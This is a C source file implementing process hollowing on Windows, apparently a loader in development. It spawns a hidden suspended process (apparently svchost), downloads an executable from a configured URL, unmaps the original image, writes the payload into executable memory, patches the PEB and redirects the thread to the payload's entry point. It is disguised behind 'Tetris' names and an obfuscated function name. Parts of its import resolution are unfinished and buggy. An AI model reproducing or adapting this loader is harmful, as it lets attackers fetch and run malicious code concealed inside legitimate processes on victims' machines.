#include <stdlib.h>
#include <stdio.h>
#include <memory.h>
#include <windows.h>
#include <wininet.h>
#include "tetris.h"
#include "ntdll_imit.h"
#include "config.h"

PROCESS_INFORMATION spawn(char *processPath){
STARTUPINFOA stInfo={0};
stInfo.cb=sizeof(stInfo);
PROCESS_INFORMATION pInfo;
if(CreateProcessA(
processPath,
NULL,
NULL,
NULL,
FALSE,
CREATE_SUSPENDED | CREATE_NO_WINDOW,
NULL,
NULL,
&stInfo,
&pInfo
))
return pInfo;
else
printf("[-] CreateProcessA %lu\n",GetLastError());
exit(1);
}

BYTE* fetchPE(char* url){

    // general initialization fn
    HINTERNET internet=InternetOpenA(
        "JAMES/BOND/007",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0 // no async
    );
    if(!internet){
        printf("[-] InternetOpenA()\n");
        exit(1);
    }
    HINTERNET hurl=InternetOpenUrlA(
        internet,
        URL,
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0
    );
    if(!hurl){
        printf("[-] InternetOpenUrlA() %lu\n",GetLastError());
        exit(1);
    }

    DWORD sz=4096;
    BYTE* pe=(BYTE*)malloc(sz);
    BYTE* offset=pe;
    DWORD totalRead=0;
    DWORD cycleRead=0;

    while(InternetReadFile(
        hurl,
        offset,
        sz, 
        &cycleRead
    ) && cycleRead>0){
        totalRead+=cycleRead;
        void*tmp=realloc(pe,totalRead+sz);
        if(tmp)
         pe=tmp;
        offset=(BYTE*)(pe+totalRead);
    }
    void*tmp=realloc(pe,totalRead);
    if(tmp)
     pe=tmp;
    return pe;
}

// objective: parse PE. return list of struct containing each essential sectton size.
// dos ---> nt head ----> file head / opt head 
// opt head ---> data directories
// 
MappingMetadata PEParser(BYTE* pe){
    MappingMetadata mm;
    // pe file base 
    mm.heapBase=pe;
    unsigned long long  p_NT_HEADERS=(unsigned long long)(pe+*(pe+0x3c));
    unsigned long long p_FILE_HEADERS=(unsigned long long)(p_NT_HEADERS+0x4);
    unsigned long long p_OPT_HEADERS=(unsigned long long)(p_NT_HEADERS+0x18);
    mm.preferedBase=*(unsigned long long*)(p_OPT_HEADERS+0x18);
    mm.RVAAddressOfEntryPoint=*(unsigned long *)(p_OPT_HEADERS+0x10);   
    mm.headersSize=*(unsigned long*)(p_OPT_HEADERS+0x3c);
    mm.imageSize=*(unsigned long*)(p_OPT_HEADERS+0x38);
    unsigned long dataDirectoriesCount=*(unsigned long*)(p_OPT_HEADERS+0x6c);
    // important
    mm.ImageSectionsCount=*(unsigned short*)(p_FILE_HEADERS+0x2);
    unsigned short optHeadersSz=*(unsigned short*)(p_FILE_HEADERS+0x10);
    // sizeof(IMAGE_SECTION_HEADER) = 40 bytes
    IMAGE_SECTION_HEADER* p_SECTION_HEADER=(IMAGE_SECTION_HEADER*)(p_NT_HEADERS+0x4+0x14+optHeadersSz);
    mm.ImageSectionHeaders=(unsigned long long )p_SECTION_HEADER;
    // extracting section alignmnet (crucial for mapping)
    mm.sectionAlignment=*(unsigned long*)(p_OPT_HEADERS+0x20);
    mm.dataDirectoryList=(unsigned long long)(p_OPT_HEADERS+0x70);
    return mm;
}



void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
    // abstract mapping routine X
    IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
    unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE

    for(int i=0; i<mm.ImageSectionsCount; i++){
    char* name=(char*)(sec->Name);
    
    if(strcmp(name,".reloc")==0){
        printf(".reloc ---- %i|||| base: %llu\n",sec->SizeOfRawData,(unsigned long long)sec);
        *reloc=sec;
        sec++;
        continue;
    }

    unsigned int protections=sec->Characteristics;
    unsigned int rva_raw=sec->PointerToRawData;
    unsigned int rva_virt=sec->VirtualAddress;

    // section size on disk (multiply of file alignment)
    unsigned long secRsz=sec->SizeOfRawData;
    // actual content size which should be alligned to section alignment
    // alignment is done by loader only when it maps subsection of IMAGE to 
    // va space.
    // i allocate contigious va space, so does not
    unsigned long _virtualSize=*(unsigned long*)((BYTE*)sec+0x8);

    printf("%s --- size on disk: %i | size in VA: %i\n",name,secRsz,_virtualSize);

    void* va=remoteV+rva_virt;
    void* raw=mm.heapBase+rva_raw;
    unsigned long long written=0;  
   
    if(!WriteProcessMemory(
        proc,
        va,
        raw,
        _virtualSize,
        &written
    )){
        printf("[-] 144 failed  to write section to p mem\n");
        exit(1);
    }

    DWORD oldProt=0;
    DWORD newProtection=0;

    if((protections & IMAGE_SCN_MEM_EXECUTE)==IMAGE_SCN_MEM_EXECUTE){
        newProtection=PAGE_EXECUTE_READ;
    }
    else if(((protections & IMAGE_SCN_MEM_READ)==IMAGE_SCN_MEM_READ) && (protections & IMAGE_SCN_MEM_WRITE)==IMAGE_SCN_MEM_WRITE){
        newProtection=PAGE_READWRITE;
    }
    else{
        newProtection=PAGE_READONLY;
    }

    VirtualProtectEx(
        proc,
        va,
        _virtualSize,
        newProtection,
        &oldProt
    );
    printf("written to %s --- %llu bytes\n",name,written);
    if(written!=(unsigned long)_virtualSize){
        printf("[-] 235!\n");
        exit(1);
    }
    sec++;
    }
    printf("all sections has been mapped!\n");
}


void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
    printf("RELLOC STARTED\n");
    // reloction block in heap (first el in list)
    BYTE* _block=(BYTE*)((BYTE*)heapBase+(unsigned int)(sec->PointerToRawData));
    
    unsigned int secSz=sec->SizeOfRawData;
    printf(".reloc ---- %i\n",secSz);
    
    long long delta = (long long)(uintptr_t)remoteImageBase - (long long)(uintptr_t)preferedBase;
    unsigned int parsedBytes=0;
    while(parsedBytes<secSz){
        IMAGE_BASE_RELOCATION* block=(IMAGE_BASE_RELOCATION*)_block;

        unsigned int blockSz=block->SizeOfBlock;
        if(blockSz==0)
            break;
        unsigned int pageRva=block->VirtualAddress;
        
        printf("block size: %i\n",blockSz);
        // this block works on given page
        uintptr_t page=(uintptr_t)((unsigned long long)remoteImageBase+pageRva);
        printf("relocation process for page: %llu\n",page);
        
        unsigned int entriesCount=(blockSz-8)/2;
        printf("entreis count: %i\n",entriesCount);

        WORD* entry=(WORD*)((BYTE*)block+8);

        for(unsigned int j=0;j<entriesCount;j++){
            
            BYTE relocType=*entry>>12;
            WORD offset=*entry & 0x0FFF;
            
            if(relocType==3 || relocType==10){
                uintptr_t absolute=page+offset;
                uintptr_t relocated = (uintptr_t)((long long)absolute + delta - (long long)(uintptr_t)preferedBase);
                printf("before relocation: %p ---- after relocation: %p\n",absolute,relocated);

                if(!WriteProcessMemory(
                    proc,
                    (void*)absolute,
                    &relocated,
                    sizeof(unsigned long long),
                    NULL
                )){
                    printf("[-] 186!\n");
                    exit(1);
                }
            }
            entry++;
        }
        parsedBytes+=blockSz;
        _block+=blockSz;
    }
    printf("relocated successfuly!\n");
}

bool syncLoadedDlls(char* dll, char*** dllList,size_t capacity){
size_t newCapacity=capacity+sizeof(char*);
char** tmp=realloc(*dllList,newCapacity);
if(tmp!=NULL)
    *dllList=tmp;

*dllList[(newCapacity/sizeof(char*))-1]=dll;
printf("DLL added to loaded dlls list\n");
return true;
}


void dumpLoadedDlls(char** dllList,size_t capacity){
    unsigned int length=(unsigned int)(capacity/sizeof(char*));
    printf("LOADED DLL LIST: \n");
    for(unsigned int i=0;i<length;i++)
        printf("%i) %s\n",i+1,dllList[i]);

}

// vergiliusproject.com 
bool injectDLL(HANDLE proc,char* dll,T_NtMapViewOfSection NtMapViewOfSection,char*** loadedDlls,size_t capacity){
    // for dll injection i had 2 options.
    // 1. open file normally and parse it and write to allocated mem in process.
    // 2. create section object backed by PE file.
    // prefered second. because windows memory manager applies rellocation
    // in that case. but i have to fill IAT still + load dll s recurisively if necess.

    char* searchDirectory="C:\\Windows\\System32\\";
    char* dll_file=calloc(strlen(searchDirectory)+strlen(dll)+1,sizeof(char));
    strcpy(dll_file,searchDirectory);
    strcat(dll_file,dll);
    HANDLE hDll=CreateFileA(
        dll_file,
        GENERIC_READ,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if(hDll==INVALID_HANDLE_VALUE){
        printf("[-] REQUIRED DLL IS NOT PRESENT ON THE SYSTEM!\n");
        exit(1);
    }
    // this fn fails
    HANDLE sectionObjectHandle=CreateFileMappingA(
        hDll,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0,
        0,
        NULL
    );
    if(sectionObjectHandle)
        printf("section object for dll file: %s is created\n",dll_file);
    else    
        exit(1);
    SIZE_T viewSz=0;
    void *dllBase=NULL;
    NTSTATUS mappedSection=NtMapViewOfSection(
        sectionObjectHandle,
        proc,
        dllBase,
        0,
        0,
        NULL,
        &viewSz,
        ViewUnmap,
        0,
        PAGE_READONLY
    );

    if(mappedSection!=0x00000000){
        printf("[-] FAILED TO MAP SECTION OBJECT IN VA SPACE. 299\n");
        exit(1);
    }
    printf("section object of type SEC_IMAGE for DLL file has been mapped to va space of process.check debugger\n");
    getchar();
    syncLoadedDlls(dll,loadedDlls,capacity);
    resolveIAT(proc,dllBase,NtMapViewOfSection,loadedDlls,capacity);
    
    // return essential info for filling IAT for those image depending on this dll
    unsigned long long test=0xFF;
    return test;
 
}   


bool isDllLoaded(char* dll,char** loaded_list,size_t capacity){
    unsigned int count=(unsigned int)(capacity/sizeof(char*));
    return false;

}


void* extractDllExportTable(){

}

// should work for both main PE and loaded DLLs
void resolveIAT(HANDLE proc,BYTE* imageBase,T_NtMapViewOfSection NtMapViewOfSection,char*** loadedDlls,size_t capacity){
    unsigned long long e_lfanew=(unsigned long long)(imageBase+0x3c);
    long e_lfanew_val=0;
    ReadProcessMemory(
        proc,
        (void*)e_lfanew,
        &e_lfanew_val,
        sizeof(long),
        NULL
    );
    unsigned long long nt_headers=(unsigned long long)(imageBase+e_lfanew_val);
    unsigned long long opt_headers=(unsigned long long)(nt_headers+0x18);
    unsigned long long dataDirectoryList=(unsigned long long)(opt_headers+0x70);
    unsigned long imageSz=0;
    ReadProcessMemory
    (
        proc,
        (void*)(opt_headers+0x38),
        &imageSz,
        sizeof(unsigned long),
        NULL
    );
    printf("IMAGE SZ FROM resolveIAT: %i\n",imageSz);
    unsigned long long import_data_directory_ls=(dataDirectoryList+(8*IMAGE_DIRECTORY_ENTRY_IMPORT));
    unsigned long va_import_data_directory_descr=0;
    unsigned long import_dd_sz=0;

    ReadProcessMemory(
        proc,
        (void*)(import_data_directory_ls),
        &va_import_data_directory_descr,
        sizeof(unsigned int),
        NULL
    );
    ReadProcessMemory(
        proc,
        (void*)(import_data_directory_ls+0x4),
        &import_dd_sz,
        sizeof(unsigned int),
        NULL
    );

    unsigned long long import_descriptor=(unsigned long long)(imageBase+va_import_data_directory_descr);

    unsigned int import_dd_count=import_dd_sz/20;
    
    while(true){
        unsigned long rva_import_name_table=0;
        unsigned long rva_iat=0;
        unsigned long rva_name=0;
        ReadProcessMemory(
            proc,
            (void*)(import_descriptor),
            &rva_import_name_table,
            sizeof(unsigned long),
            NULL
        );
        if(rva_import_name_table==0 && rva_iat==0)
            break;
        ReadProcessMemory(
            proc,
            (void*)(import_descriptor+16),
            &rva_iat,
            sizeof(unsigned long),
            NULL
        );
        ReadProcessMemory(
            proc,
            (void*)(import_descriptor+12),
            &rva_name,
            sizeof(unsigned long),
            NULL
        );
 
        unsigned long long import_name_table=(unsigned long long)(imageBase+rva_import_name_table);
        unsigned long long import_address_table=(unsigned long long)(imageBase+rva_iat);
        unsigned long long dll_name=(unsigned long long)(imageBase+rva_name);


        char c='x';
        int read=0;
        char *__dll__name=calloc(30,1);
        while(read<49){
        ReadProcessMemory(
            proc,
            (void*)(dll_name+read),
            &c,
            sizeof(char),
            NULL
        );
        strcpy((char*)(__dll__name+read),&c);
        if(c==0)
            break;
        read++;
        }
        // dll name format is: name.dll
        printf("working on DLL: %s\n",__dll__name);
        if(isDllLoaded(__dll__name,*loadedDlls,capacity))
        {
            unsigned long long table=(unsigned long long)extractDllExportTable();
            // apply IAT resolving
        }
        else
        {
            unsigned long long base=injectDLL(proc,__dll__name,NtMapViewOfSection,loadedDlls,capacity);
            // apply IAT resolving 

        }

        import_descriptor+=20;
    }


}


bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
HANDLE self=GetCurrentProcess();
HMODULE ntdll=GetModuleHandleA("ntdll");
T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
T_NtMapViewOfSection NtMapViewOfSection=(T_NtMapViewOfSection)GetProcAddress(ntdll,"NtMapViewOfSection");
if(NtMapViewOfSection)
    printf("Address of NtMapViewOfSection: %p\n",NtMapViewOfSection);
T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");
    
PROCESS_BASIC_INFORMATION self_pinfo;
unsigned long sz=sizeof(self_pinfo);
    if(NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &self_pinfo,
        sz,
        &sz
    )!=0)
        NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &self_pinfo,
        sz,
        &sz
    );

    BYTE* selfPEB=self_pinfo.PebBaseAddress;


 PROCESS_BASIC_INFORMATION pinfo;
 ULONG requiredSize=sizeof(pinfo);
if(NtQueryInformationProcess(
    proc,
   ProcessBasicInformation,
   &pinfo,
   requiredSize,
   &requiredSize
)!=0){
    NtQueryInformationProcess(
    proc,
   ProcessBasicInformation,
   &pinfo,
   requiredSize,
   &requiredSize
);
}
// stores address of PEB. only makes sense within VA space of remote process. not here
void* baseAddrAddr=(void*)((BYTE*)pinfo.PebBaseAddress+0x10);
uintptr_t baseAddr=0;
ReadProcessMemory(proc,baseAddrAddr,&baseAddr,sizeof(PVOID),NULL);
if(NtUnmapViewOfSection(proc,(void*)baseAddr)!=0){
    printf("[-] NtUnmapViewOfSection()!\n");
    exit(1);
} // disassociates VA region from section object


printf("section object has been unmaped. you can check via debugger and then press enter to continue \
        program execution!\n");

getchar();

printf("continiueueueuing execution\n");


// compare PEParser to  reversing pe fields.
MappingMetadata mm=PEParser(pe);
printf(
    "heap base: %llu | prefered base: %llu | image size: %lu | headers size: %lu\n",
    mm.heapBase,mm.preferedBase,mm.imageSize,mm.headersSize
);

char* remoteV=(char*)VirtualAllocEx(
proc,
(void*)mm.preferedBase,
(SIZE_T)mm.imageSize,
MEM_COMMIT | MEM_RESERVE,
0x40
);

if(!remoteV)
    remoteV=(char*)VirtualAllocEx(
        proc,
        NULL,
        (SIZE_T)mm.imageSize,
        MEM_COMMIT | MEM_RESERVE,
        0x40
);

printf("new base address of target process: %lu\n",remoteV);

if(WriteProcessMemory(
    proc,
    remoteV,
    mm.heapBase,
    mm.headersSize,
    NULL
)){
    printf("headers has been written. check with debugger. then enter to continue\n");
    getchar();
};

IMAGE_SECTION_HEADER *reloc=NULL;
if(!KERNEL_STYLE){
    mapRoutineX(proc,remoteV,mm,&reloc); // ELSE mapRoutineY();
    printf("sections has been mapped! check with debugger\n");
    getchar();
}
if(mm.preferedBase!=(unsigned long long)remoteV && reloc!=NULL)
    rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);



// adjusting image base in remote PEB

if(!WriteProcessMemory(
    proc,
    baseAddrAddr,
    (void*)&remoteV,
    sizeof(unsigned long long),
    NULL
)){
    printf("PEB CANT BE ADJUSTED!\n");
    exit(1);
}






char* native="ntdll.dll";
size_t capacity=sizeof(char*);
char** loadedDlls=malloc(capacity);
loadedDlls[0]=native;

resolveIAT(proc,remoteV,NtMapViewOfSection,&loadedDlls,capacity);

dumpLoadedDlls(loadedDlls,capacity);


uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);

printf("address of entry point is: %p\n",(void*)entryPont);
printf("address of entry point is: %llu\n",entryPont);


printf("ENTRY POINT: %llu\n",entryPont);
CONTEXT thContext;
if(!GetThreadContext(thread,&thContext))
    printf("[-] 288!\n");
    
thContext.Rip=(DWORD64)entryPont;
if(!SetThreadContext(thread,&thContext))
    printf("[-] 293!\n");

printf("PRESS ENT TO RESUME THREAD!\n");
getchar();

if(ResumeThread(thread)!=-1){
    printf("main thread started!\n");
    return true;
}
return false;
}

bool __0x1FN3C3SS4RY__(){
    PROCESS_INFORMATION pinfo=spawn(PROCESS);
    printf("CHECK PROCESS WITH DEBUGGER BEFORE UNMAP //// SVCHOST PID: %i\n",pinfo.dwProcessId);
    getchar();
    HANDLE hProc=pinfo.hProcess;
    HANDLE hMainThread=pinfo.hThread;
    BYTE* pe=fetchPE(URL); // returns heap base 
    bool cool=hallowAndStart(hProc,hMainThread,pe);
    if(cool)
        return true;
    exit(1);
}
extern bool initializeTetrix(){
  return __0x1FN3C3SS4RY__();
}


int main(){
    initializeTetrix();
    return 0;
}



// section object mappnig approach
// void mapRoutineY(){
// HANDLE pe_headers_section;
// NtCreateSection(
// &pe_headers_section,
// SECTION_ALL_ACCESS,
// NULL,
// mm.headersSize,
// PAGE_READWRITE,
// SEC_COMMIT,
// NULL
// );
// if(!pe_headers_section){
//     printf("[-]NtCreateSection for PE HEADERS MAPPNG!\n");
//     exit(1);
// }

// void* mapped=NULL;
// if(NtMapViewOfSection(
//     pe_headers_section,
//     self,
//     mapped,
//     0,
//     0,
//     NULL,
//     (unsigned long*)&mm.headersSize,
//     PAGE_READWRITE
// )!=0 && !mapped){
//     printf("[-] NtMapViewOfSection. 168\n");
//     exit(1);
// }
// memcpy(mapped,mm.heapBase,mm.headersSize);

// void *remoteBase=NULL;
// if(NtMapViewOfSection(
//     pe_headers_section,
//     proc,  
//     remoteBase
//     0,
//     0,
//     NULL,
//     (unsigned long*)&mm.headersSize,
//     PAGE_READWRITE
// )!=0 && !mapped){
//     printf("[-] NtMapViewOfSection. 168\n");
//     exit(1);
// }
// }